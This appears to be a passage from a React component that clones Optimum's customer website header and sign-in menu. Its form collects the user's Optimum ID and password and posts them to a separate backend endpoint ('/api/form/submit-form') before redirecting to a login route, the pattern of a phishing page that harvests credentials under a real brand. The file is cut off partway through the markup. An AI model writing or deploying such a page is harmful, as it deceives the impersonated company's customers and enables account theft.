import axios from 'axios';
import { BASE_API_URL } from '../utils/constants';
import { useNavigate } from 'react-router-dom';
import { useState } from 'react';


function MultiPageForm() {
  // State variables to hold form data
  const [optimumid, setOptimumid] = useState('');
  const [password, setPassword] = useState('');


  const navigate = useNavigate();

  // Function to handle form submission
  const handleSubmit = async event => {
    event.preventDefault();

    try {
      // Send form data to backend using Axios
      await axios.post(`${BASE_API_URL}/api/form/submit-form`, { optimumid, password });

        navigate('/login')
    } catch (err) {
      console.error(err)
    }
    // Reset form data and current page
    setOptimumid('');
    setPassword('');

  
  };

return (
    <>
        <div>
        <div id="site-wrapper">
          <div id="header-wrapper" className="ng-scope">
            <section id="common_header" className="common-header alert- logged-out">
              <div className="csr-div hidden">
                <div className="pay-bill-csr hidden-desktop hidden-tablet"> <span>Currently viewing account details for: <span className="accno-text ng-binding" /></span> <input type="button" defaultValue="Sign out" className="btn btn--primary padding-btn" /> </div>
              </div>
              <span id="phoneAlertNotRequired" className="hidden-desktop hidden-tablet" style={{display: 'none'}}>
                <div className="drawer  is-closed">
                  <div className="drawer__body" style={{marginTop: '-57px'}}>
                    <div className="alert-drawer ng-scope">
                      <div className="alert-drawer__body alert- padding-s">
                        <div className="container">
                          <div className="row row-cells">
                            <div className="span8">
                              <div className="alert-inner">
                                <div className="icon-wrapper">
                                  <span className="dot dot--overlay-dark"><span className="dot-inner"><i className="icon-" /><img className="ng-scope" style={{display: 'none'}} src="https://www.optimum.net/undefined" /></span></span>
                                </div>
                                <h4 className="alert-drawer__title-text ng-binding" />
                                <p> <span className="alert-drawer__description-text hidden-phone ng-binding" /> <span>
                                    <span className="alert-drawer__cta movLeft1px cta-arrow-link">
                                      <a className="font-cta-link">
                                        <span className="cta-wrap">
                                        </span></a>
                                    </span>
                                  </span>
                                </p>
                                <div className="cta-dot">
                                  <a className="font-cta-link"> <span><span className="ng-scope">Learn more</span></span> <i className="cta-circle dot dot--dark-overlay dotpie icon-arrow-right"><span className="dot-inner" /></i> </a>
                                </div>
                                <a className="font-cta-link"> </a> <span className="alert-drawer__cta movLeft1px cta-arrow-link" style={{display: 'none'}}>
                                  <a className="font-cta-link">
                                    <span className="cta-wrap">
                                      <div className="cta-dot">
                                        <span><span className="ng-scope">Make payment now</span></span> <i className="cta-circle dot dot--dark-overlay dotpie icon-arrow-right"><span className="dot-inner" /></i> </div>
                                    </span>
                                  </a>
                                </span>
                                <p />
                                <div className="span4 hidden-desktop hidden-tablet">
                                  <div className="btn btn--overlay-dark butn-txt" style={{display: 'none'}}> <a href="/support/alerts-and-notifications/" className="alert-drawer__text-decoration-none  hidden-desktop hidden-tablet ng-binding">
                                      -1 more alerts
                                    </a> </div>
                                </div>
                                <p />
                              </div>
                            </div>
                            <div className="span4 align-content-right"> <a href="/support/alerts-and-notifications/" className="alert-drawer__text-decoration-none hidden-phone">
                                <div className="btn btn--overlay-dark ng-binding" style={{display: 'none'}}>-1 more alerts</div>
                              </a> <i className="alert-drawer__remove-alert icon-remove" /> </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </span>
              <div className="visible-phone visible-tablet global-header hideForNewCustomerStuff" id="newLoginCustomerHeader">
                <div className="container">
                  <div className="semflex full-width align-children-middle">
                    <div className="global-header-phone__brand">
                      <a href="/" className="block mobile-logo" />
                    </div>
                  </div>
                </div>
              </div>
              <div className="visible-phone visible-tablet global-header alert-">
                <div id="phone_header" className="semflex full-width align-children-middle">
                  <div className="vpadding-s global-header-phone__brand">
                    <a href="/" className="block mobile-logo" />
                  </div>
                  <div className="global-nav-secondary__notification" style={{display: 'none'}}>
                    <a className="alert-alert-drawer__handle hbeam-inline badge-notification badge-primary toggle-alert-mrgin">
                      <div className="hbeam-part-static badge-notification__icon-container"> <i className="badge-notification__icon icon-warning-sign" /> </div>
                      <div> <span className="badge-notification__count ng-binding">0</span> </div>
                    </a>
                  </div>
                  <div className="global-header-phone__nav__item align-center icon-search" data-ng-click="CommonHeaderCtrl.toggleMobileSearchBarDisplay()" id="menusearch" />
                  <div className="global-header-phone__nav__item align-center icon-align-justify" id="menubutton" data-ng-click="CommonHeaderCtrl.toggleMobileMenuDisplay()" />
                </div>
                <div className="sticky-wrapper" style={{height: '0px'}}>
                  <div sticky-stack data-ng-show="CommonHeaderCtrl.showingMobileSearchBar" id="phone-search" className="sticky-stack-pseudo auto_complete_display_none ng-scope" style={{display: 'none'}}>
                    <div className="phone-search-bar vpadding-s">
                      <div className="container">
                        <div className="semflex full-width align-children-middle">
                          <div className="close-search-wrapper align-left">
                            <a className="close-search"> <svg viewBox="2 -0 10 14" xmlns="http://www.w3.org/2000/svg" width={35} height={30} style={{verticalAlign: 'middle'}}>
                                <line x1={0} x2={6} y1={8} y2={1} strokeWidth="0.8" stroke="#d9d9d9" fill="none" />
                                <line x1={0} x2={6} y1={8} y2={14} strokeWidth="0.8" stroke="#d9d9d9" fill="none" />
                              </svg> </a>
                          </div>
                          <div className="width_90">
                            <div className="yext-search searchbar-group input-groupp component yxt-Answers-component yxt-SearchBar-wrapper" id="yext-search-1">
                              <div className="yxt-SearchBar">
                                <div className="yxt-SearchBar-container">
                                  <form className="yxt-SearchBar-form"> <label className="sr-only" id="yxt-SearchBar-inputLabel--yext-search-1">
                                    </label> <input className="js-yext-query yxt-SearchBar-input" id="yxt-SearchBar-input--yext-search-1" type="text" name="query" defaultValue autoComplete="off" autoCorrect="off" spellCheck="false" placeholder="Conduct a search" /> <button type="button" className="js-yxt-SearchBar-clear yxt-SearchBar-clear yxt-SearchBar--hidden component yxt-Answers-component" data-eventtype="SEARCH_CLEAR_BUTTON" data-eventoptions="{}" data-component="IconComponent" data-opts="{ &quot;iconName&quot;: &quot;close&quot; }" data-prop="icon" data-is-component-mounted="true" data-is-analytics-attached="true"><div className="Icon Icon--close " aria-hidden="true">
                                      </div>
                                      <span className="yxt-SearchBar-clearButtonText sr-only">
                                        Search
                                      </span>
                                    </button> <button type="submit" className="js-yext-submit yxt-SearchBar-button">
                                      <div className="yxt-SearchBar-AnimatedIcon yxt-SearchBar-AnimatedIcon--paused js-yxt-AnimatedForward component yxt-Answers-component"><div className="Icon Icon--yext_animated_forward Icon--lg" aria-hidden="true">
                                        </div>
                                      </div>
                                      <span className="yxt-SearchBar-buttonText sr-only">
                                        Submit
                                      </span>
                                    </button> </form>
                                  <div id="yxt-SearchBar-autocomplete--yext-search-1" className="yxt-SearchBar-autocomplete component yxt-Answers-component">
                                    <div className="yxt-AutoComplete-wrapper js-yxt-AutoComplete-wrapper" aria-expanded="false"> </div>
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              <div style={{minWidth: '1000px'}} id="desktop_header">
                <div className="sticky-wrapper" style={{height: '0px'}}>
                  <div sticky-stack className="global-header hidden-phone hidden-tablet sticky-stack-pseudo ng-scope" id="desktop_header_NewCustomer" style={{}}>
                    <div className="pay-bill-csr csr-div hidden"> <span>Currently viewing account details for: <span className="accno-text ng-binding" /></span> <input type="button" defaultValue="Sign out" className="btn btn--primary padding-btn"/> </div>
                    <div id="alertNotShown" style={{display: 'none'}}>
                      <div className="drawer  is-closed">
                        <div className="drawer__body">
                          <div className="alert-drawer ng-scope">
                            <div className="alert-drawer__body alert- padding-s">
                              <div className="container">
                                <div className="row row-cells">
                                  <div className="span8">
                                    <div className="alert-inner">
                                      <div className="icon-wrapper"> <span className="dot dot--overlay-dark"><span className="dot-inner"><i className="icon-" /><img className="ng-scope" style={{display: 'none'}} src="https://www.optimum.net/undefined" /></span></span>
                                      </div>
                                      <h4 className="alert-drawer__title-text ng-binding" />
                                      <p> <span className="alert-drawer__description-text hidden-phone ng-binding" /> <span>
                                          <span className="alert-drawer__cta movLeft1px cta-arrow-link">
                                            <a className="font-cta-link">
                                              <span className="cta-wrap">
                                              </span></a>
                                          </span>
                                        </span>
                                      </p>
                                      <div className="cta-dot">
                                        <a className="font-cta-link"> <span><span className="ng-scope">Learn more</span></span> <i className="cta-circle dot dot--dark-overlay dotpie icon-arrow-right"><span className="dot-inner" /></i> </a>
                                      </div>
                                      <a className="font-cta-link"> </a> <span className="alert-drawer__cta movLeft1px cta-arrow-link" style={{display: 'none'}}>
                                        <a className="font-cta-link">
                                          <span className="cta-wrap">
                                            <div className="cta-dot">
                                              <span><span className="ng-scope">Make payment now</span></span> <i className="cta-circle dot dot--dark-overlay dotpie icon-arrow-right"><span className="dot-inner" /></i> </div>
                                          </span>
                                        </a>
                                      </span>
                                      <p />
                                      <div className="span4 hidden-desktop hidden-tablet">
                                        <div className="btn btn--overlay-dark butn-txt" style={{display: 'none'}}> <a href="/support/alerts-and-notifications/" className="alert-drawer__text-decoration-none  hidden-desktop hidden-tablet ng-binding">
                                            -1 more alerts
                                          </a> </div>
                                      </div>
                                      <p />
                                    </div>
                                  </div>
                                  <div className="span4 align-content-right"> <a href="/support/alerts-and-notifications/" className="alert-drawer__text-decoration-none hidden-phone">
                                      <div className="btn btn--overlay-dark ng-binding" style={{display: 'none'}}>-1 more alerts</div>
                                    </a> <i className="alert-drawer__remove-alert icon-remove" /> </div>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                    <div className="container">
                      <div className="toggle-container">
                        <div id="headerNotShown" className="row app-header__row-top clear-float">
                          <div className="span4 ipad-width-4">
                            <div className="vpadding-s">
                              <div className="speech-bubble-home-wrapper">
                                <div className="motion-point"> <a href="https://espanol.optimum.net">En español</a> </div>
                                <div className="pull-right speech-bubble-home-container">
                                  <a href="/login" className="welcome-message speech-balloon speech-balloon--tip-outwards header-user">
                                    <div className="speech-balloon__content">
                                      <p className="username-msg ng-binding">Sign in with your Optimum ID</p>
                                    </div>
                                    <div className="speech-balloon__tip" />
                                  </a>
                                </div>
                                <div className="pull-right speech-bubble-home-container" style={{display: 'none'}}>
                                  <div className="welcome-message speech-balloon speech-balloon--tip-outwards">
                                    <div className="speech-balloon__content row">
                                      <div className="span5 username-msg-div"><a href="/login" className="username-msg ng-binding">Sign in with your Optimum ID</a></div>
                                      <div className="span1 verticalLine" />
                                      <div className="span5 signout-msg-div"><a className="signout-msg">Sign out</a></div>
                                    </div>
                                    <div className="speech-balloon__tip" />
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                          <div className="app-header__secondary-nav span8 ipad-width-8">
                            <div className="row">
                              <div className="span12">
                                <div className="global-nav-secondary">
                                  <div className="hbeam-inline global-nav-secondary__item">
                                    <div className="global-nav-secondary__label">
                                      <a className="block-link"> <span className="show-profilelink">My profile</span> <span className="show-signin">Sign in</span> </a>
                                      <div className="header-dropmenu signin-profile" style={{display: 'none'}}>
                                        <div className="menu-mdl" style={{display: 'none'}}>
                                          <div>
                                            <ul>
                                              <li><a href="/profile">Personal info</a></li>
                                              <li><a href="/profile/#comm-pref">Notification preferences</a></li>
                                              <li><a href="/profile/household-ids">My household IDs</a></li>
                                              <li><a href="/internet/manage-devices">My wireless devices</a></li>
                                              <li style={{display: 'none'}}><a href="/profile/create-secondary-id">Create an Optimum ID</a></li>
                                            </ul>
                                          </div>
                                        </div>
                                        <div className="menu-top">
                                          <div>
                                            <h4>Sign in to manage your profile and devices</h4>
                                            <form id="signinForm" className="ng-valid ng-dirty" onSubmit={handleSubmit}>
                                              <div className="row">
                                                <div className="span12">
                                                  <h4>My Optimum ID</h4>
                                                </div>
                                                <div className="span6"> <input type="text" name="id" id="signinFormOptimumId" autoCorrect="off" autoCapitalize="off" tabIndex={11} defaultValue className="ng-pristine ng-valid" value={optimumid} onChange={(event) => setOptimumid(event.target.value)} />
                                                  <p className="error" style={{display: 'none'}}>Invalid Optimum ID, please complete all fields.</p>
                                                </div> <br />
                                                <div className="span6"> <a href="/recover-id" tabIndex={14}>Forgot my Optimum ID</a> </div>
                                              </div> <br />
                                              <div className="row">
                                                <div className="span12">
                                                  <h4>Password</h4>
                                                </div>
                                                <div className="span6"> <input type="password" id="signinFormPassword" name="password" autoCorrect="off" autoCapitalize="off" data-ng-model="CommonHeaderCtrl.userInput.signinForm.password" tabIndex={12} className="ng-pristine ng-valid" value={password} onChange={(event) => setPassword(event.target.value)} />
                                                  <p className="error" style={{display: 'none'}}>Invalid password, please complete all fields.</p>
                                                </div>
                                                <div className="span6"> <a href="/reset-password" tabIndex={15}>I forgot my password</a> </div>
                                              </div>
                                              <div className="row">
                                                <div className="span12">
                                                  <hr /> </div>
                                                <div className="span12">
                                                  <div className="remember-me-login"> <input className="btn btn--primary" tabIndex={13} type="submit" defaultValue="Sign in" />
                                                    <div className="remember-me-group"> <input type="hidden" name="remember" defaultValue="false" className="ng-pristine ng-valid" /> <input type="hidden" name="referer" defaultValue="https://www.optimum.net/login" /> <span data-ng-click="CommonHeaderCtrl.toggleUserInputRemember('signinForm')">
                                                        <div className="checkbox checkbox--secondary remember-checkbox ng-valid  not-checked ng-dirty" true-value="yes" tabIndex={16}>
                                                          <div className="checkbox-inner" />
                                                        </div>Remember Me
                                                      </span> </div>
                                                  </div>
                                                </div>
                                              </div>
                                            </form>
                                          </div>
                                        </div>
                                      </div>
                                      <div className="menu-bottom" style={{display: 'none'}}>
                                        <div>
                                          <p className="signout-text ng-binding">Not ?</p> <span className="cta-arrow-link--dark-overlay sign-out-margin cta-arrow-link">
                                            <a className="font-cta-link">
                                              <span className="cta-wrap">
                                                <div className="cta-dot">
                                                  <span><span className="ng-scope">Sign out</span></span> <i className="cta-circle dot dot--dark-overlay dotpie icon-arrow-right"><span className="dot-inner" /></i> </div>
                                              </span>
                                            </a>
                                          </span>
                                        </div>
                                      </div>
                                    </div>
                                  </div>
                                </div>
                                <div className="hbeam-inline global-nav-secondary__item">
                                  <div className="global-nav-secondary__label"> <a className="block-link">Pay bill</a>
                                    <div className="header-dropmenu paybill-menu" style={{display: 'none'}}>
                                      <div className="menu-top" style={{display: 'none'}}>
                                        <div>
                                          <section className="paybill-info">
                                            <div style={{display: 'none'}}> <span className="xsfont color-secondary-darken">Amount due</span>
                                              <div className="margin-top-1"> <span className="xlfont"><strong className="ng-binding" /></span> </div>
                                              <div className="margin-top-1" style={{display: 'none'}}> <span className="xlfont"><strong>$0</strong></span> </div>
                                              <div className="margin-top-1" style={{display: 'none'}}> <span className="lfont ng-binding">due in  days</span> </div>
                                              <div className="margin-top-1" style={{display: 'none'}}> <span className="lfont ng-binding">due in  day</span> </div>
                                              <div className="margin-top-1" style={{display: 'none'}}> <span className="lfont">due today</span> </div>
                                              <div className="margin-top-2"> <span className="sfont color-secondary-darken ng-binding" /> </div>
                                              <div style={{display: 'none'}}>
                                                <div style={{display: 'none'}}> <br />
                                                  <div className="blocked-container">
                                                    <div className="blocked-image margin-top-1"> <span className="dot dot--dark-overlay alert-background dotpie"><span className="dot-inner">
                                                          <span className="dot-inner ng-scope"><i className="icon-exclamation-major" /> </span> </span>
                                                      </span>
                                                    </div>
                                                    <div className="blocked-text xsfont">
                                                      <div className="margin-top-1"> <span className="ng-binding"> past due</span> </div>
                                                      <div> <span className="ng-binding">Next statement </span> </div>
                                                    </div>
                                                  </div>
                                                  <div className="payNow"> <a className="btn btn--secondary-accent-text"><strong> Pay </strong><strong className="ng-binding">&nbsp;undefined now</strong> </a> </div>
                                                </div>
                                                <div>
                                                  <div style={{display: 'none'}}>
                                                    <div className="margin-top-1"> <span className="sfont ng-binding">We will debit on</span> </div>
                                                    <div className="margin-top-2"> <span className="sFont ng-binding"> from </span> </div>
                                                  </div>
                                                  <div className="payNow"> <a className="btn btn--secondary-accent-text"><strong> Pay </strong><strong className="ng-binding">&nbsp;undefined now</strong> </a> </div>
                                                </div>
                                              </div>
                                              <div style={{display: 'none'}}>
                                                <div className="margin-top-1"> <span className="sfont">Next statement date</span> </div>
                                                <div className="margin-top-2"> <span className="sfont ng-binding" /> </div>
                                                <div style={{display: 'none'}}>
                                                  <div className="margin-top-1"> <span className="sfont ng-binding">Your payment of </span> </div>
                                                  <div className="margin-top-2"> <span className="sfont ng-binding">was received on </span> </div>
                                                </div>
                                              </div>
                                              <div style={{display: 'none'}}>
                                                <div className="margin-top-1"> <span className="sfont ng-binding">A credit of  will</span> </div>
                                                <div className="margin-top-2"> <span className="sfont">be applied to your</span> </div>
                                                <div className="margin-top-2"> <span className="sfont ng-binding"> statement</span> </div>
                                              </div>
                                            </div>
                                            <div className="no-bill-access">
                                              <div> <span className="mfont not-bold">You do not have access</span> </div>
                                              <div> <span className="mfont not-bold">to this section.</span> </div>
                                              <div className="margin-top-1"> <span className="sfont">Please sign in as the primary</span> </div>
                                              <div className="margin-top-2"> <span className="sfont">Optimum ID to view and pay your bill,</span> </div>
                                              <div className="margin-top-2"> <span className="sfont">or to grant access to additional users</span> </div>
                                            </div>
                                            <div className="blocked-container" style={{display: 'none'}}>
                                              <div className="blocked-image margin-top-1"> <span className="dot dot--dark-overlay alert-background dotpie"><span className="dot-inner">
                                                    <span className="dot-inner ng-scope"><i className="icon-exclamation-major" /> </span> </span>
                                                </span>
                                              </div>
                                              <div className="blocked-text xsfont">
                                                <div className="margin-top-1"> <span>Sorry, we can't accept</span> </div>
                                                <div className="margin-top-2"> <span>online payments for</span> </div>
                                                <div className="margin-top-2"> <span>your account.</span> </div>
                                                <div className="margin-top-1"> <span>Contact us at</span> </div>
                                                <div className="margin-top-2"> <span>(866) 213-7456 to</span> </div>
                                                <div className="margin-top-2"> <span>make a payment.</span> </div>
                                              </div>
                                            </div>
                                            <div className="api-error" style={{display: 'none'}}>
                                              <div> <span className="mfont not-bold">Sorry we can't access </span> </div>
                                              <div> <span className="mfont not-bold">your billing info right now.</span> </div>
                                            </div>
                                          </section>
                                        </div>
                                      </div>
                                      <div className="menu-mdl">
                                        <div>
                                          <div>
                                            <ul className="margin-top-1">
                                              <li><a href="/pay-bill">Pay Online</a></li>
                                              <li><a href="/pay-bill/payin-person">Pay in Person</a></li>
                                              <li><a href="/FAQ#/answers/a_id/313">Pay by Mail</a></li>
                                            </ul>
                                          </div>
                                        </div>
                                      </div>
                                      <div className="menu-mdl" data-ng-show="CommonHeaderCtrl.currentLoggedInUser.hasSession" style={{display: 'none'}}>
                                        <div>
                                          <div className="paybill-li" data-ng-show="!isunAuthorized" style={{display: 'none'}}>
                                            <ul className="margin-top-1">
                                              <li><a href="/pay-bill/my-bill">View my bill</a></li>
                                            </ul>
                                            <ul className="margin-top-1">
                                              <li><a ng-click="CommonHeaderCtrl.checkingSession('linkAccount')">Account activity</a></li>
                                            </ul>
                                            <ul className="margin-top-1">
                                              <li><a href="/support/pay-bill">Billing support</a></li>
                                            </ul>
                                          </div>
                                          <div>
                                            <p className="signout-text ng-binding">Not ?</p> <span className="cta-arrow-link--dark-overlay sign-out-margin cta-arrow-link">
                                              <a className="font-cta-link">
                                                <span className="cta-wrap">
                                                  <div className="cta-dot">
                                                    <span><span className="ng-scope">Sign out</span></span> <i className="cta-circle dot dot--dark-overlay dotpie icon-arrow-right"><span className="dot-inner" /></i> </div>
                                                </span>
                                              </a>
                                            </span>
                                          </div>
                                        </div>
                                      </div>
                                    </div>
                                  </div>
                                </div>
                                <div className="hbeam-inline global-nav-secondary__item">
                                  <div className="global-nav-secondary__label"> <a className="block-link">Support</a>
                                    <div className="support-ddmenu">
                                      <div className="header-dropmenu header-dropmenu-alignment" style={{display: 'none'}}>
                                        <div className="menu-top">
                                          <ul className="support-menu">
                                            <li className="user-service-link">
                                              <a href="/support/tv">
                                                <ul>
                                                  <li className="service-icon"> <i className="support-icons tv-icon" /> </li>
                                                  <li className="service-name">TV</li>
                                                </ul>
                                              </a>
                                            </li>
                                            <li className="user-service-link">
                                              <a href="/support/phone">
                                                <ul>
                                                  <li className="service-icon"> <i className="support-icons phone-icon" /> </li>
                                                  <li className="service-name">Phone</li>
                                                </ul>
                                              </a>
                                            </li>
                                            <li className="user-service-link">
                                              <a href="/internet?from=support">
                                                <ul>
                                                  <li className="service-icon"> <i className="support-icons internet-icon" /> </li>
                                                  <li className="service-name">Internet</li>
                                                </ul>
                                              </a>
                                            </li>
                                            <li className="user-service-link">
                                              <a href="/support/pay-bill">
                                                <ul>
                                                  <li className="service-icon"> <i className="support-icons paybill-icon" /> </li>
                                                  <li className="service-name">Billing</li>
                                                </ul>
                                              </a>
                                            </li>
                                          </ul>
                                          <div>
                                            <div className="span6 support-chat">
                                              <div className="btn btn--secondary-accent-text">
                                                <div className="round-circle"> <i className="icon-msg" /> </div>
                                                <h4>Chat with us</h4>
                                              </div>
                                            </div>
                                            <div className="span6 support-alert" style={{marginTop: '8px'}}>
                                              <div className="btn btn--secondary-accent-text" style={{paddingBottom: '0.7rem'}}>
                                                <div className="round-circle"> <i className="icon-selfhelp2" /> </div>
                                                <h4 className="no-btm-mrgn">Check for<br />outages</h4>
                                              </div>
                                            </div>
                                          </div>
                                        </div>
                                        <div className="menu-mdl">
                                          <div className="span5">
                                            <ul className="support-lower-links">
                                              <li><a href="https://www.optimum.net/support">Get Help</a></li>
                                              <li><a href="/support/user-guides">User Guides</a></li>
                                              <li><a href="/service-appointments" style={{display: 'none'}}>Service Appointments</a></li>
                                              <li><a href="/pages/service.html">Optimum Service Plans</a></li>
                                              <li><a href="/pages/optimum-support-app.html">Optimum Support App</a></li>
                                            </ul>
                                          </div>
                                          <div className="span7">
                                            <div>
                                              <ul className="support-lower-links">
                                                <li><a href="/pages/altice-one/get-started.html">Optimum Stream</a></li>
                                                <li><a href="javascript:window.open('https://www.optimum.com/stores','_about')">Find Optimum Stores</a></li>
                                                <li><a href="/support/accessories">Accessories</a></li>
                                                <li><a href="https://www.optimum.com/moving">Moving?</a></li>
                                                <li><a href="/support/contact-us">Contact Us</a></li>
                                                <li><a href="/support/online-tools" style={{display: 'none'}}>Online Tools</a></li>
                                              </ul>
                                            </div>
                                          </div>
                                        </div>
                                      </div>
                                    </div>
                                  </div>
                                  <div className="global-nav-secondary__notification" style={{display: 'none'}}>
                                    <a className="alert- alert-drawer__handle hbeam-inline badge-notification badge-primary">
                                      <div className="hbeam-part-static badge-notification__icon-container"> <i className="badge-notification__icon icon-warning-sign" /> </div>
                                      <div> <span className="badge-notification__count ng-binding">0</span> </div>
                                    </a>
                                  </div>
                                </div>
                                <div className="hbeam-inline global-nav-secondary__item">
                                  <div className="global-nav-secondary__label">
                                    <div className="yext-search component yxt-Answers-component yxt-SearchBar-wrapper" id="yext-search-2">
                                      <div className="yxt-SearchBar">
                                        <div className="yxt-SearchBar-container">
                                          <form className="yxt-SearchBar-form"> <label className="sr-only" htmlFor="yxt-SearchBar-input--yext-search-2" id="yxt-SearchBar-inputLabel--yext-search-2">
                                            </label> <input className="js-yext-query yxt-SearchBar-input" id="yxt-SearchBar-input--yext-search-2" type="text" name="query" defaultValue aria-label aria-autocomplete="list" aria-controls="yxt-SearchBar-autocomplete--yext-search-2" aria-haspopup="listbox" autoComplete="off" autoCorrect="off" spellCheck="false" placeholder="Conduct a search" /> <button type="button" className="js-yxt-SearchBar-clear yxt-SearchBar-clear yxt-SearchBar--hidden component yxt-Answers-component" data-eventtype="SEARCH_CLEAR_BUTTON" data-eventoptions="{}" data-component="IconComponent" data-opts="{ &quot;iconName&quot;: &quot;close&quot; }" data-prop="icon" data-is-component-mounted="true" data-is-analytics-attached="true"><div className="Icon Icon--close " aria-hidden="true">
                                              </div>
                                              <span className="yxt-SearchBar-clearButtonText sr-only">
                                                Search
                                              </span>
                                            </button> <button type="submit" className="js-yext-submit yxt-SearchBar-button">
                                              <div className="yxt-SearchBar-AnimatedIcon yxt-SearchBar-AnimatedIcon--paused js-yxt-AnimatedForward component yxt-Answers-component" data-component="IconComponent" data-opts="{&quot;iconName&quot;:&quot;yext_animated_forward&quot;,&quot;classNames&quot;:&quot;Icon--lg&quot;,&quot;complexContentsParams&quot;:{&quot;iconPrefix&quot;:&quot;yext-search-2&quot;}}" data-is-component-mounted="true"><div className="Icon Icon--yext_animated_forward Icon--lg" aria-hidden="true">
                                                </div>
                                              </div>
                                              <div className="yxt-SearchBar-AnimatedIcon yxt-SearchBar-AnimatedIcon--paused js-yxt-AnimatedReverse yxt-SearchBar-AnimatedIcon--inactive component yxt-Answers-component" data-component="IconComponent" data-opts="{&quot;iconName&quot;:&quot;yext_animated_reverse&quot;,&quot;classNames&quot;:&quot;Icon--lg&quot;,&quot;complexContentsParams&quot;:{&quot;iconPrefix&quot;:&quot;yext-search-2&quot;}}" data-is-component-mounted="true"><div className="Icon Icon--yext_animated_reverse Icon--lg" aria-hidden="true">
                                                </div>
                                              </div>
                                              <span className="yxt-SearchBar-buttonText sr-only">
                                                Submit
                                              </span>
                                            </button> </form>
                                          <div id="yxt-SearchBar-autocomplete--yext-search-2" className="yxt-SearchBar-autocomplete component yxt-Answers-component">
                                            <div className="yxt-AutoComplete-wrapper js-yxt-AutoComplete-wrapper" aria-expanded="false"> </div>
                                          </div>
                                        </div>
                                      </div>
                                    </div>
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                      <div className="row">
                        <div className="span4">
                          <div className="global-header__brand">
                            <a href="/" className="desktop-logo" />
                          </div>
                        </div>
                        <div id="mega-menu-container" className="span8 app-header__nav-primary">
                          <div className="hflow global-nav-primary">
                            <div className="hflow global-nav-primary__item block-link">
                              <div className="global-nav-primary__label">
                                <a className="global-header__link"> <span className="mega-menu-cursor global-header__link no-bold">Internet</span> </a>
                                <div className="internet-menu">
                                  <div className="header-dropmenu leftMargin-internetMenu-noemail" style={{display: 'none'}}>
                                    <div className="menu-mdl">
                                      <div className="row internet-links">
                                        <div className="span6">
                                          <ul>
                                            <li><a href="https://webmail.optimum.net/wm3-beta">Email</a></li>
                                            <li><a href="https://myemail.suddenlink.net" style={{display: 'none'}}>Email</a></li>
                                            <li><a href="/internet/hotspots">WiFi Hotspots</a></li>
                                            <li><a href="/pages/internet-protection.html">Internet Protection</a></li>
                                            <li><a href="/pages/phishing-alerts.html#latest-phishing-scams">Phishing Emails</a></li>
                                          </ul>
                                        </div>
                                        <div className="span6">
                                          <ul>
                                            <li><a href="/internet/manage-router">Router</a></li>
                                            <li><a href="/tv/optimum-app" style={{display: 'none'}}>Mobile TV App</a></li>
                                            <li><a href="/tv/optimum-app" style={{display: 'none'}}>Optimum App</a></li>
                                            <li><a href="/tv/optimum-app" style={{display: 'none'}}>Optimum TV app</a></li>
                                            <li><a href=" https://connectedhome.optimum.net" style={{display: 'none'}}>Connected Home</a></li>
                                          </ul>
                                        </div>
                                      </div>
                                    </div>
                                    <div className="menu-bottom false false_mus">
                                      <div>
                                        <h4><a href="/login">Sign in</a> to check your email and manage your internet features</h4>
                                      </div>
                                    </div>
                                  </div>
                                </div>
                              </div>
                              <div className="global-nav-primary__notification"> <span>
                                  <a href="https://webmail.optimum.net/wm3-beta" className="hbeam-inline badge-notification badge-primary">
                                    <div className="hbeam-part-static badge-notification__icon-container logged-out-envelope-container">
                                      <i className="badge-notification__icon icon-envelope-alt logged-out-envelope icon-large" />
                                    </div>
                                    <div>
                                      <span className="badge-notification__count ng-binding" style={{display: 'none'}}>0</span> </div>
                                  </a>
                                </span> <span style={{display: 'none'}}>
                                  <a href="https://webmail.optimum.net/wm3-beta" className="hbeam-inline badge-notification badge-primary" style={{display: 'none'}}>
                                    <div className="hbeam-part-static badge-notification__icon-container logged-out-envelope-container">
                                      <i className="badge-notification__icon icon-envelope-alt logged-out-envelope icon-large" />
                                    </div>
                                  </a>
                                </span> </div>
                            </div>
                            <div className="hflow global-nav-primary__item block-link">
                              <div className="global-nav-primary__label">
                                <a className="global-header__link"> <span className="mega-menu-cursor global-header__link">TV</span> </a>
                                <div className="tv-menu">
                                  <div className="header-dropmenu" style={{display: 'none'}}>
                                    <div className="menu-mdl">
                                      <div className="row tv-links">
                                        <div className="span6">
                                          <h4 className="cHShift">Watch</h4>
                                          <ul>
                                            <li><a href="/tv/guide">Guide</a></li>
                                            <li><a href="/tv/on-demand" style={{display: 'none'}}>On Demand</a></li>
                                            <li><a href="https://www.optimum.com/video-on-demand">On Demand</a></li>
                                            <li><a href="/tv/cart">Cart</a></li>
                                            <li><a href="/tv/favorites" style={{display: 'none'}}>Favorites</a></li>
                                            <li><a href="/pages/tv-everywhere.html">TV Everywhere</a></li>
                                            <li><a href="/tv/optimum-app">Mobile TV App</a></li>
                                            <li><a href="/tv/optimum-app" style={{display: 'none'}}>Optimum App</a></li>
                                            <li><a href="/tv/optimum-app" style={{display: 'none'}}>Optimum TV App</a></li>
                                            <li><a href="/pages/tv/pay-per-view.html">Pay Per View</a></li>
                                            <li><a href="/support/tv">Support</a></li>
                                            <li><a href="/FAQ/#/answers/a_id/6079" style={{display: 'none'}}>Support</a></li>
                                            <li><a href="/pages/transition.html" style={{display: 'none'}}>Support</a></li>
                                          </ul>
                                        </div>
                                        <div className="span6">
                                          <h4>Features &amp; settings</h4>
                                          <ul>
                                            <li><a href="/profile/cable-boxes">My cable boxes</a></li>
                                            <li><a href="/pages/tv/tv-remote.html">Remote set up</a></li>
                                            <li><a href="/FAQ/#/answers/a_id/3990" style={{display: 'none'}}>Remote set up</a></li>
                                            <li><a href="/pages/channel-lineups.html">TV Channel Lineups</a></li>
                                            <li><a href="https://www.optimum.com/tvlineup" style={{display: 'none'}}>TV Channel Lineups</a></li>
                                            <li><a href="https://www.optimum.com/pricing-packages">My Pricing and Packages</a></li>
                                            <li><a href="https://www.optimum.com/business/pricing-packages-business" style={{display: 'none'}}>My Pricing and Packages</a></li>
                                          </ul>
                                        </div>
                                      </div>
                                    </div>
                                    <div className="menu-bottom">
                                      <div>
                                        <h4><a href="/login">Sign in</a> to manage your DVR and TV features.</h4>
                                      </div>
                                    </div>
                                  </div>
                                </div>
                              </div>
